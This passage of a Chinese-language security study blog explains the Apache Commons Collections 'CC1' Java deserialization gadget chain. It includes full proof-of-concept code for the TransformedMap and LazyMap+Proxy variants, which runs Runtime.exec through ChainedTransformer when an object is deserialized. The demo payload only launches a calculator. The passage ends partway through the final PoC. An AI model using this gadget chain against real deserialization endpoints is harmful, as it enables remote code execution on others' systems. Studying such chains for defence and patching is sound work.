<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1TransformedMap</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br><br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br><br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br><br>        &#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        chainedTransformer.transform(Runtime.class);<br><br><span class="hljs-comment">//        Method getRuntimeMeth = (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class);</span><br><span class="hljs-comment">//        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getRuntimeMeth);</span><br><span class="hljs-comment">//        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span><br><br><span class="hljs-comment">//        Class clz = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="hljs-comment">//        Method getRuntimeMeth = clz.getMethod(&quot;getRuntime&quot;);</span><br><span class="hljs-comment">//        Runtime runtime = (Runtime) getRuntimeMeth.invoke(null, null);</span><br><span class="hljs-comment">//        Method execMeth = clz.getMethod(&quot;exec&quot;, String.class);</span><br><span class="hljs-comment">//        execMeth.invoke(runtime, &quot;calc&quot;);</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后配合复写点，把<code>chainedTransformer.transform(Runtime.class);</code>通过<code>ConstantTransformer</code>把值固化在数组第一位，触发了反序列化就能直接循环数组 RCE 了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>         Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Math.class);<br>         declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>         declaredConstructor.newInstance(Target.class,transformers);<br></code></pre></td></tr></table></figure><p>由于后续涉及到<code>hm.put()</code>第一个参数必须为<code>value</code>才能触发的问题</p><p>这里直接给出完整可执行的 poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1TransformedMap</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;),<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        hm.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map decorate = TransformedMap.decorate(hm, <span class="hljs-keyword">null</span>, chainedTransformer);<br><br>        Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object newInstance = declaredConstructor.newInstance(Retention.class, decorate);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(newInstance);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在上边使用<code>TransformedMap.decorate.put</code>没有使用<code>AnnotationInvocationHandler</code>作为序列化触发点时，在<code>TransformedMap.decorate</code>修饰过的<code>HashMap</code>得到的<code>outerMap(转化Map)</code>中传入<code>put</code>参数其实任意皆可，此处如果修改<code>hm.put(&quot;value&quot;,&quot;value&quot;);</code>第一个参数<code>&quot;value&quot;</code>为其他值则不能执行：没有报错，也生成了序列化流(能输出序列化对象)，那问题出在哪？</p><p>p 牛直接给出了条件：</p><p><strong>HashMap.put() 第一个参数必须为 value</strong></p><p>在反序列化的<code>AnnotationInvocationHandler.readObject</code>中，根据条件，动态调试可知，当第一个参数为<code>value</code>时，<code>var7!=null</code>进入后续的<code>var5.setValue</code></p><p>到这里还是不清楚：</p><ol><li>为什么这里第一个参数是<code>value</code>时<code>var7</code>不为空？</li><li>反射调用<code>AnnotationInvocationHandler</code>构造方法时，传入了<code>Over.class</code>，这个如何得来的</li><li>这里的<code>setValue</code>是如何触发的？（当然在 class 反编译的雏形来看，上边 poc 修改 value 即<code>setValue</code>的触发方式应该来源于这里）</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">hashMap.put(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>);<span class="hljs-comment">//必须要先存入随意的键值对，下面两行代码修改这个键值对的值触发</span><br>Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();<br>onlyElement.setValue(<span class="hljs-string">&quot;c&quot;</span>);<br></code></pre></td></tr></table></figure><p>深入学习一下：</p><blockquote><p>sun 包的代码是反编译后的，可读性较差，在 openjdk 导入相对应版本的源码进行阅读</p><p>根据 b 站师傅—白日梦组长 在 b 站的讲解，下载 8u_65 以及<a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4%EF%BC%8C%E9%85%8D%E7%BD%AE%E5%9C%A8idea%E9%87%8C%EF%BC%8C%E8%AF%A6%E8%A7%81https://www.bilibili.com/video/BV1no4y1U7E1?spm_id_from=333.999.0.0&amp;vd_source=2a1f7b45ce481b5d9d0f29cabd7578a5">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4，配置在idea里，详见https://www.bilibili.com/video/BV1no4y1U7E1?spm_id_from=333.999.0.0&amp;vd_source=2a1f7b45ce481b5d9d0f29cabd7578a5</a> 空降：8:23</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220824224527904.png"></p><p><code>AnnotationType</code>是什么来的？</p><p>这就要引出 java 新的知识点</p><p><strong>AnnotationType</strong></p><p>注解、标释，这是具有和接口、类一样的地位一种类型，在 Java SE 5.0 引入的概念</p><ul><li>注解的定义</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> A&#123;&#125;<br></code></pre></td></tr></table></figure><p>通过 interface 定义，如此就创建了一个 A 的注解</p><ul><li>注解的使用</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@A</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span></span>&#123;&#125;<br></code></pre></td></tr></table></figure><p>在类 A 的定义商法加上 <code>@A</code> 就可以用<code>A</code>注解这个类</p><p>可以理解为 A 这个类像个标签一样贴在 Demo 这个类上面</p><ul><li>元注解</li></ul><p>还要使其正常使用的话，还需要元注解：元注解是可以注解(V.)到注解(n.)上的注解(n.)，即是一种基本注解，只有五个</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Retention</span>  <span class="hljs-comment">//约束注解的生命周期，有三个值：源码级别(source)、类文件级别(class)、运行时级别(runtime)</span><br><span class="hljs-meta">@Documented</span> <span class="hljs-comment">//被修饰的注解会生成到javadoc中</span><br><span class="hljs-meta">@Target</span>     <span class="hljs-comment">//约束注解可以应用的地方(如方法、类或字段)</span><br><span class="hljs-meta">@Inherited</span>  <span class="hljs-comment">//让注解被&quot;继承&quot;：子类Class对象可使用getAnnotations()获取父类被@Inherited修饰的注解</span><br><span class="hljs-meta">@Repeatable</span> <span class="hljs-comment">//注解多值</span><br><br><span class="hljs-comment">//https://www.cnblogs.com/-zhong/p/14961183.html</span><br></code></pre></td></tr></table></figure><p>最早接触的注解应该是继承父类重写了方法时 idea 自动生成的<code>@Override</code></p><p>比如这个例子中重写了<code>Object.equals</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Object</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> age;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Person</span><span class="hljs-params">(<span class="hljs-keyword">int</span> age)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Person p1 = <span class="hljs-keyword">new</span> Person(<span class="hljs-number">21</span>);<br>        Person p2 = <span class="hljs-keyword">new</span> Person(<span class="hljs-number">21</span>);<br>        String a = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;helloworld&quot;</span>);<br>        String b = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;helloworld&quot;</span>);<br>        System.out.println(a == b);<br>        System.out.println(a.equals(b));<br>        System.out.println(p1.equals(p2));<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">equals</span><span class="hljs-params">(Object obj)</span> </span>&#123;<br>        Person p = (Person) obj;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.age == p.age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以看到<code>@Override</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> java.lang;<br><br><span class="hljs-keyword">import</span> java.lang.annotation.*;<br><br><span class="hljs-meta">@Target(ElementType.METHOD)</span>  <span class="hljs-comment">//注解到方法</span><br><span class="hljs-meta">@Retention(RetentionPolicy.SOURCE)</span>  <span class="hljs-comment">//生命周期为源码级</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Override &#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>回到这个链上</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220825002800801.png"></p><p>要触发<code>setValue</code>就要<code>memberType != null</code>，就要从<code>xxx.class</code>找到其成员方法，而传入的 class 要是<code>AnnotationType</code>类型的，说白了现在就是填入一个元注解，以及在 Map 传入一个键为该元注解的成员方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Documented</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Target(ElementType.ANNOTATION_TYPE)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Retention &#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Returns the retention policy.</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> the retention policy</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function">RetentionPolicy <span class="hljs-title">value</span><span class="hljs-params">()</span></span>;<br>&#125;<br><br><span class="hljs-meta">@Documented</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Target(ElementType.ANNOTATION_TYPE)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Target &#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Returns an array of the kinds of elements an annotation type</span><br><span class="hljs-comment">     * can be applied to.</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> an array of the kinds of elements an annotation type</span><br><span class="hljs-comment">     * can be applied to</span><br><span class="hljs-comment">     */</span><br>    ElementType[] value();<br>&#125;<br></code></pre></td></tr></table></figure><p>因此填入<code>Target.class Retention.class</code>均可，以及有且仅有的这个<code>value</code>方法</p><p>然后跟进发现<code>setValue</code>调用<code>AbstractInputCheckedMapDecorator.SetValue</code>继续调用<code>checkSetValue</code>方法，然后就是依次调用了<code>chainedTransformer</code>的<code>transform</code>方法，RCE</p><blockquote><p>8u_71 修改了 sun.reflect.annotation.AnnotationInvocationHandler.readObject 复写点，因此 cc1 只适合在 8u71 之前利用</p></blockquote><h4 id="②LazyMap-Proxy"><a href="#②LazyMap-Proxy" class="headerlink" title="②LazyMap+Proxy"></a>②LazyMap+Proxy</h4><p>在<code>ysoserial</code>中，其实并没有用到<code>TransformeredMap</code>，而是使用的<code>LazyMap</code></p><p>区别在于：<code>TransformeredMap</code>在写入元素时调用了<code>transform</code>，而<code>LazyMap</code>是在<code>get</code>时找不到值就调用了<code>transform</code>方法(实现了懒加载)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">get</span><span class="hljs-params">(Object key)</span> </span>&#123;<br>        <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>        <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-keyword">false</span>) &#123;<br>            Object value = factory.transform(key);<br>            map.put(key, value);<br>            <span class="hljs-keyword">return</span> value;<br>        &#125;<br>        <span class="hljs-keyword">return</span> map.get(key);<br>    &#125;<br></code></pre></td></tr></table></figure><p>相比于<code>TransformedMap</code>，<code>LazyMap+AnnotationInvocationHandler</code>组合利用方式更为复杂，因为利用<code>AnnotationInvocationHandler</code>的复写点<code>readObject</code>是没有直接调用<code>Map.get</code></p><p>但是<code>AnnotationInvocationHandler</code>的<code>invoke</code>方法有<code>get</code>方法的调用，注意到这个<code>AnnotationInvocationHandler</code>实现了<code>InvocationHandler</code>接口，那么可以<code>Proxy</code>进行动态代理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1LazyMap</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br><span class="hljs-comment">//        Map decorate = TransformedMap.decorate(hm, null, chainedTransformer);</span><br>        Map decorate = LazyMap.decorate(hm, chainedTransformer);<br><br>        Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br><br><span class="hljs-comment">//        Object newInstance = declaredConstructor.newInstance(Retention.class, decorate);</span><br>        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Retention.class, decorate);<span class="hljs-comment">//生成InvocationHandler类型的类实例</span><br>        Map proxymap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;,invocationHandler);<span class="hljs-comment">//生成代理类实例，代理invocationHandler实例</span><br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br><span class="hljs-comment">//        oos.writeObject(newInstance);</span><br>        oos.writeObject(invocationHandler);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然而此时还不能命令执行(此处看 p 牛的文章没看懂后续再用一次<code>AnnotationInvocationHandler</code>包裹，有点绕)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">        Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br><br><span class="hljs-comment">//        Object newInstance = declaredConstructor.newInstance(Retention.class, decorate);</span><br>        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Retention.class, decorate);<span class="hljs-comment">//生成InvocationHandler类型的类实例</span><br>        Map proxymap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;,invocationHandler);<span class="hljs-comment">//生成代理类实例，代理invocationHandler实例</span><br></code></pre></td></tr></table></figure><p>此时传入<code>AnnotationInvocationHandler</code>的构造方法是<code>LazyMap</code>的类对象，即<code>AnnotationInvocationHandler(Retention.class,decorate)</code>，再动态代理这个实现了<code>InvocationHandler</code>的<code>AnnotationInvocationHandler</code></p><p>我们知道，使用动态代理必须是一个接口类，于是在代理<code>AnnotationInvocationHandler</code>后进行了<code>Map</code>强转，然后再<code>AnnotationInvocationHandler.readObject</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br></code></pre></td></tr></table></figure><p>这里<code>memberValues.entrySet-&gt;LazyMap.entrySet-&gt;Map.entrySet-&gt;AnnotationInvocationHandler.invoke</code>好像天衣无缝，问题正是在这，最后我们并不能如愿的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">oos.writeObject(proxymap)<br></code></pre></td></tr></table></figure><p><code>Map</code>是没有实现<code>Serializable</code>的，那么我们还需要<code>AnnotationInvocationHandler</code>再对这个<code>Map</code>进行包裹</p><p>最终 POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> 